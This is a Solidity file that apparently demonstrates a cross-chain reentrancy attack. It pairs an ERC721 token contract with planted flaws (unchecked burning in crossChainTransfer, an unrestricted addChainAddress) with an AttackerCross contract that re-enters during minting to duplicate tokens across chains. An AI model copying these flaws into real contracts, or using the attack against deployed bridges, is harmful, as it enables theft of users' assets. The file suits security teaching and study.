// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {ReentrancyGuard} from "./ReentrancyGuard.sol";

contract CrossChainToken is ERC721("CrossChainToken", "CCTK"), ReentrancyGuard {
    uint256 public currentTokenId = 1;

    mapping(uint256 chainId => address) addressByChainId;

    event CrossChainTransfer(uint256 crossChainId, address contractAddress, bytes message);

    function mint(address to) public noReentrancy returns (uint256) {
        uint256 newTokenId = currentTokenId++;

        _safeMint(to, newTokenId);

        return newTokenId;
    }

    function crossChainTransfer(uint256 crossChainId, address to, uint256 tokenId) external {
         _burn(tokenId); // 1

         emit CrossChainTransfer(crossChainId, addressByChainId[crossChainId], abi.encode(tokenId, msg.sender, to));
    }

    function addChainAddress(uint256 chainId, address contractAddress) external {
        addressByChainId[chainId] = contractAddress;
    }
}

contract AttackerCross is IERC721Receiver {
    bool public hasReentered;
    address public beneficiary;
    CrossChainToken public contractChainA;

    constructor(CrossChainToken _contractChainA) {
        beneficiary = msg.sender;
        contractChainA = _contractChainA;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {
        if (!hasReentered) {
            contractChainA.crossChainTransfer(2, beneficiary, tokenId); // 1

            hasReentered = true;

            contractChainA.mint(beneficiary);
        }

        return this.onERC721Received.selector;
    }
}